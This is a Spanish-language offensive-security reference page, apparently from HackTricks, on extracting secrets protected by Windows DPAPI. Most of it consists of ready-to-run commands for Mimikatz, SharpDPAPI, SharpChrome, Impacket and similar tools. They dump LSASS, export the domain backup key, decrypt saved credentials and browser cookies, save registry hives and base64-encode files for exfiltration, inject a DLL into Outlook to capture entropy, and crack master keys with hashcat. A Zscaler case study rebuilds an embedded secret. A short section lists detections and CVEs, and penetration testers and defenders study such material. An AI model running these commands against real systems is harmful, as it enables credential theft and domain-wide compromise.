# DPAPI - Extracción de contraseñas

{{#include ../../banners/hacktricks-training.md}}



## Qué es DPAPI

La Data Protection API (DPAPI) se utiliza principalmente dentro del sistema operativo Windows para el **cifrado simétrico de claves privadas asimétricas**, utilizando secretos del usuario o del sistema como una fuente importante de entropía. Este enfoque simplifica el cifrado para los desarrolladores, ya que les permite cifrar datos mediante una clave derivada de los secretos de inicio de sesión del usuario o, en el caso del cifrado del sistema, de los secretos de autenticación del dominio del sistema, evitando así que los desarrolladores tengan que gestionar por sí mismos la protección de la clave de cifrado.

La forma más común de utilizar DPAPI es mediante las funciones **`CryptProtectData` y `CryptUnprotectData`**, que permiten a las aplicaciones cifrar y descifrar datos utilizando el contexto de seguridad del proceso que ha iniciado sesión. De forma predeterminada, los datos solo pueden ser descifrados por el mismo contexto de usuario o sistema que los cifró.<sup>[[2]](#references)[[3]](#references)</sup>

Estas funciones también aceptan un **parámetro de entropía** opcional utilizado durante el cifrado y el descifrado. Los datos protegidos con entropía opcional requieren ese mismo valor de entropía para su descifrado.<sup>[[2]](#references)[[6]](#references)</sup>

### Generación de claves de usuario

DPAPI deriva un valor específico del usuario (a menudo denominado **pre-key**) a partir de las credenciales del usuario. La derivación exacta depende de la cuenta y de la versión del sistema operativo. Por ejemplo, Impacket prueba una ruta HMAC-SHA1 basada en el resumen SHA-1 de la contraseña en UTF-16LE, otra basada en el hash MD4/NT de la contraseña y una ruta derivada mediante PBKDF2-SHA256 para Protected Users. Por este motivo, las herramientas offline a menudo pueden derivar el material necesario a partir de la contraseña en texto plano o de un hash NT disponible.<sup>[[2]](#references)[[10]](#references)</sup>

Esto es especialmente interesante porque si un atacante puede obtener el hash de contraseña del usuario, puede:

- **Descifrar cualquier dato que se haya cifrado utilizando DPAPI** con la clave de ese usuario sin necesidad de contactar con ninguna API
- Intentar **crackear la contraseña** offline para intentar generar la clave DPAPI válida

DPAPI mantiene una o más **claves maestras** para cada usuario, en lugar de crear una nueva clave maestra para cada blob protegido. Cada clave maestra tiene un **GUID** (Globally Unique Identifier), y un blob cifrado registra qué clave maestra lo protege.<sup>[[2]](#references)</sup>

Las claves maestras se almacenan en el directorio **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, donde `{SID}` es el Security Identifier del usuario. El archivo de la clave maestra contiene material protegido por la **pre-key** del usuario y, para los usuarios del dominio, material de recuperación protegido por una **domain backup key**.<sup>[[2]](#references)</sup>

Ten en cuenta que la **domain key utilizada para cifrar la clave maestra se encuentra en los controladores de dominio y nunca cambia**, por lo que si un atacante tiene acceso al controlador de dominio, puede recuperar la domain backup key y descifrar las claves maestras de todos los usuarios del dominio.<sup>[[2]](#references)</sup>

Los blobs cifrados contienen el **GUID de la clave maestra** utilizada para cifrar los datos en sus encabezados.

> [!TIP]
> Los blobs cifrados con DPAPI comienzan con **`01 00 00 00`**

Buscar claves maestras:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Esto es lo que tendrá el conjunto de Master Keys de un usuario:

![Qué es DPAPI - generación de claves de usuario: esto es lo que tendrá el conjunto de Master Keys de un usuario](<../../images/image (1121).png>)

### Generación de claves de máquina/sistema

Esta es la clave que utiliza la máquina para cifrar datos. Se basa en el **secreto LSA DPAPI_SYSTEM**, que es una clave especial a la que solo puede acceder el usuario SYSTEM. Esta clave se utiliza para cifrar datos que deben estar disponibles para el propio sistema, como credenciales a nivel de máquina o secretos de todo el sistema.<sup>[[2]](#references)</sup>

Ten en cuenta que estas claves **no tienen un backup de dominio**, por lo que solo están accesibles localmente:

- **Mimikatz** puede acceder a ella volcando los secretos LSA mediante el comando: `mimikatz lsadump::secrets`
- El secreto se almacena dentro del registro, por lo que un administrador podría **modificar los permisos DACL para acceder a él**. La ruta del registro es: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- También es posible realizar una extracción offline desde los registry hives. Por ejemplo, como administrador en el objetivo, guarda los hives y exfiltralos:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Luego, en tu equipo de análisis, recupera el secreto LSA DPAPI_SYSTEM de los hives y úsalo para descifrar blobs de ámbito de máquina (contraseñas de tareas programadas, credenciales de servicios, perfiles Wi-Fi, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Ejemplo de DPAPI específico de Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Datos protegidos por DPAPI

Entre los datos personales protegidos por DPAPI se incluyen:

- Credenciales de Windows
- Contraseñas y datos de autocompletado de Internet Explorer y Google Chrome
- Contraseñas de cuentas de correo electrónico y FTP interno para aplicaciones como Outlook y Windows Mail
- Contraseñas de carpetas compartidas, recursos, redes inalámbricas y Windows Vault, incluidas las claves de cifrado
- Contraseñas de conexiones de escritorio remoto, .NET Passport y claves privadas para diversos fines de cifrado y autenticación
- Contraseñas de red administradas por Credential Manager y datos personales de aplicaciones que usan CryptProtectData, como Skype, MSN messenger y otras
- Blobs cifrados dentro del registro
- ...

Los datos protegidos por el sistema incluyen:
- Contraseñas de Wifi
- Contraseñas de tareas programadas
- ...

### Opciones de extracción de master key

- Si el usuario tiene privilegios de administrador del dominio, puede acceder a la **clave de respaldo del dominio** para descifrar todas las master keys de usuario del dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegios de administrador local, es posible **acceder a la memoria de LSASS** para extraer las claves maestras de DPAPI de todos los usuarios conectados y la clave de SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si el usuario tiene privilegios de administrador local, puede acceder al **secreto LSA DPAPI_SYSTEM** para descifrar las claves maestras de la máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si se conoce la contraseña o el hash NTLM del usuario, puedes **descifrar directamente las master keys del usuario**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si estás dentro de una sesión como el usuario, es posible solicitar al **DC la backup key para descifrar las master keys mediante RPC**. Si eres administrador local y el usuario ha iniciado sesión, podrías **robar su token de sesión** para esto:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acceder a datos cifrados con DPAPI

### Encontrar datos cifrados con DPAPI

Los **archivos protegidos** de los usuarios suelen estar en:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Comprueba también cambiando `\Roaming\` por `\Local\` en las rutas anteriores.

Ejemplos de enumeración:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) puede encontrar blobs cifrados con DPAPI en el sistema de archivos, el registro y blobs B64:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Ten en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repo) puede utilizarse para descifrar datos sensibles como cookies mediante DPAPI.<sup>[[12]](#references)</sup>

#### Recetas rápidas de Chromium/Edge/Electron (SharpChrome)

- Usuario actual, descifrado interactivo de credenciales/cookies guardadas (funciona incluso con las cookies vinculadas a la aplicación de Chrome 127+ porque la clave adicional se resuelve desde el Credential Manager del usuario al ejecutarse en el contexto del usuario):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Análisis offline cuando solo tienes archivos. Primero extrae la clave de estado AES del "Local State" del perfil y, después, úsala para descifrar la DB de cookies:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage remoto/en todo el dominio cuando tienes la clave de backup de dominio de DPAPI (PVK) y permisos de administrador en el host objetivo:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Si tienes la prekey/credkey de DPAPI de un usuario (obtenida de LSASS), puedes omitir el password cracking y descifrar directamente los datos del perfil:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Las versiones más recientes de Chrome/Edge pueden almacenar ciertas cookies mediante cifrado "App-Bound". El descifrado offline de esas cookies específicas no es posible sin la clave app-bound adicional; ejecuta SharpChrome bajo el contexto del usuario objetivo para recuperarla automáticamente. Consulta la publicación del blog de seguridad de Chrome referenciada a continuación.<sup>[[5]](#references)</sup>

### Claves de acceso y datos

- **Usa SharpDPAPI** para obtener credenciales de archivos cifrados con DPAPI de la sesión actual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtener información de las credenciales** como los datos cifrados y el guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Acceder a masterkeys**:

Descifra una masterkey de un usuario que solicita la **domain backup key** mediante RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
La herramienta **SharpDPAPI** también admite estos argumentos para el descifrado de masterkeys (observa que es posible usar `/rpc` para obtener la clave de backup del dominio, `/password` para usar una contraseña en texto plano o `/pvk` para especificar un archivo de clave privada de dominio de DPAPI...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descifrar datos usando una masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
La herramienta **SharpDPAPI** también admite estos argumentos para el descifrado de `credentials|vaults|rdg|keepass|triage|blob|ps` (observa que es posible usar `/rpc` para obtener la clave de backup del dominio, `/password` para usar una contraseña en texto plano, `/pvk` para especificar un archivo de clave privada de dominio DPAPI, `/unprotect` para usar la sesión del usuario actual...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Usar una prekey/credkey de DPAPI directamente (no se necesita contraseña)

Si puedes hacer dump de LSASS, Mimikatz suele exponer una clave de DPAPI por inicio de sesión que puede utilizarse para descifrar las masterkeys del usuario sin conocer la contraseña en texto plano. Pasa este valor directamente a las herramientas:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Descifrar algunos datos usando la **sesión del usuario actual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Descifrado offline con Impacket dpapi.py

Si tienes el SID y la contraseña del usuario víctima (o el hash NT), puedes descifrar completamente offline las masterkeys de DPAPI y los blobs de Credential Manager mediante dpapi.py de Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifica los artefactos en el disco:
- Blob(s) de Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey correspondiente: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Si las herramientas de transferencia de archivos fallan, convierte los archivos a base64 en el host y copia el resultado:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Descifra la masterkey con el SID y la contraseña/hash del usuario:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Usa la masterkey descifrada para descifrar el credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Este flujo de trabajo suele recuperar credenciales de dominio guardadas por aplicaciones mediante Windows Credential Manager, incluidas cuentas administrativas (por ejemplo, `*_adm`).

---

### Gestión de entropía opcional ("Third-party entropy")

Algunas aplicaciones pasan un valor de **entropía** adicional a `CryptProtectData`. Sin este valor, el blob no puede descifrarse, incluso si se conoce la masterkey correcta. Por lo tanto, obtener la entropía es esencial al atacar credenciales protegidas de esta forma (por ejemplo, Microsoft Outlook y algunos clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) es una DLL en modo usuario que aplica hooks a las funciones DPAPI dentro del proceso objetivo y registra de forma transparente cualquier entropía opcional proporcionada. Ejecutar EntropyCapture en modo **DLL-injection** contra procesos como `outlook.exe` o `vpnclient.exe` genera un archivo que asigna cada búfer de entropía al proceso solicitante y al blob. Posteriormente, la entropía capturada puede proporcionarse a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) para descifrar los datos.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft introduced a **context 3** masterkey format starting with Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) added hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) and **22102** (context 3), allowing GPU-accelerated cracking of user passwords directly from the masterkey file. Attackers can therefore perform word-list or brute-force attacks without interacting with the target system.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automates the process:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
La herramienta también puede analizar blobs de Credential y Vault, descifrarlos con claves cracked y exportar contraseñas en texto claro.<sup>[[8]](#references)</sup>


### Acceder a los datos de otra máquina

En **SharpDPAPI y SharpChrome** puedes indicar la opción **`/server:HOST`** para acceder a los datos de una máquina remota. Por supuesto, debes poder acceder a esa máquina y, en el siguiente ejemplo, se supone que se conoce la **clave de cifrado de backup del dominio**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Otras herramientas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y equipos del directorio LDAP y la extracción de la clave de backup del controlador de dominio mediante RPC. A continuación, el script resolverá la dirección IP de todos los equipos y realizará un smbclient en cada equipo para recuperar todos los blobs DPAPI de todos los usuarios y descifrarlo todo con la clave de backup del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista de equipos extraída de LDAP puedes encontrar cada subred, incluso si no las conocías.

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar automáticamente secretos protegidos por DPAPI. La versión 2.x introdujo:<sup>[[9]](#references)</sup>

* Recopilación paralela de blobs de cientos de hosts
* Análisis de masterkeys de **contexto 3** e integración automática con Hashcat para cracking
* Compatibilidad con cookies cifradas "App-Bound" de Chrome (consulta la siguiente sección)
* Un nuevo modo **`--snapshot`** para consultar repetidamente los endpoints y comparar los blobs creados recientemente

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un parser en C# para archivos de masterkey/credential/vault que puede generar formatos de Hashcat/JtR y, opcionalmente, iniciar el cracking automáticamente. Es totalmente compatible con los formatos de masterkey de máquina y de usuario hasta Windows 11 24H1.<sup>[[8]](#references)</sup>


## Detecciones comunes

- Acceso a archivos en `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` y otros directorios relacionados con DPAPI.
- Especialmente desde un recurso compartido de red como **C$** o **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** o herramientas similares para acceder a la memoria de LSASS o volcar masterkeys.
- Evento **4662**: *Se realizó una operación en un objeto*; puede correlacionarse con el acceso al objeto **`BCKUPKEY`**.
- Evento **4673/4674** cuando un proceso solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades y cambios del ecosistema de 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (noviembre de 2023). Un atacante con acceso de red podía engañar a un miembro del dominio para que recuperara una clave de backup DPAPI maliciosa, permitiendo descifrar las masterkeys de los usuarios. Se corrigió en la actualización acumulativa de noviembre de 2023; los administradores deben asegurarse de que los DC y las estaciones de trabajo estén completamente actualizados.<sup>[[4]](#references)</sup>
* **Cifrado de cookies “App-Bound” de Chrome 127** (julio de 2024): sustituyó la protección heredada basada únicamente en DPAPI por una clave adicional almacenada en el **Credential Manager** del usuario. El descifrado offline de las cookies ahora requiere tanto la masterkey de DPAPI como la **clave app-bound envuelta con GCM**. SharpChrome v2.3 y DonPAPI 2.x pueden recuperar la clave adicional cuando se ejecutan con el contexto del usuario.<sup>[[5]](#references)</sup>


### Caso práctico: Zscaler Client Connector – Entropía personalizada derivada del SID

Zscaler Client Connector almacena varios archivos de configuración en `C:\ProgramData\Zscaler` (por ejemplo, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada archivo se cifra con **DPAPI (ámbito de máquina)**, pero el proveedor proporciona una **entropía personalizada** que se *calcula en tiempo de ejecución* en lugar de almacenarse en el disco.<sup>[[1]](#references)</sup>

La entropía se reconstruye a partir de dos elementos:

1. Un secreto codificado directamente dentro de `ZSACredentialProvider.dll`.
2. El **SID** de la cuenta de Windows a la que pertenece la configuración.

El algoritmo implementado por la DLL equivale a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Dado que el secreto está integrado en una DLL que se puede leer desde el disco, **cualquier atacante local con privilegios SYSTEM puede regenerar la entropía para cualquier SID** y descifrar los blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
El descifrado produce la configuración JSON completa, incluidos todos los **device posture checks** y sus valores esperados; esta información es muy valiosa al intentar realizar bypasses del lado del cliente.

> CONSEJO: los otros artefactos cifrados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) están protegidos con DPAPI **sin entropía** (`16` bytes cero). Por lo tanto, pueden descifrarse directamente con `ProtectedData.Unprotect` una vez obtenidos privilegios de SYSTEM.

## References

- [1] [Synacktiv – ¿Deberías confiar en tu zero trust? Bypassing de los posture checks de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Secretos de DPAPI. Análisis de seguridad y recuperación de datos en DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lectura de secretos cifrados con DPAPI mediante Mimikatz y C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Vulnerabilidad de spoofing de Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Mejora de la seguridad de las cookies de Chrome en Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: extracción sencilla de entropía opcional de DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Notas de la versión de hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – repositorio de GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – página del proyecto en PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: abuso de ACL de AD, cracking de Argon2 de KeePassXC y descifrado de DPAPI hasta obtener acceso de administrador del DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – uso y opciones](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
